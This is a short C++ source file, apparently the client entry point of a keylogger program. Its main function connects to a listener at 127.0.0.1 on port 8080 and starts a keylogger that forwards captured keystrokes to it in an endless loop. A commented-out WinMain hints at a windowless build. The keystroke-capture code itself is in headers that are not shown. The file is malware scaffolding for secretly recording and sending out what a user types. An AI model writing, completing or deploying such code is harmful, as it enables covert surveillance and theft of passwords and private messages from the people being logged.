//CLIENT

#include "keylogger.h"
#include "client.h"
#include <Windows.h>

/*int WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance,
LPTSTR    lpCmdLine,
int       cmdShow)*/
int main()
{
	Client client(8080, "127.0.0.1");
	client.c_connect();
	Keylogger k;
	k.start(client); //endless loop
}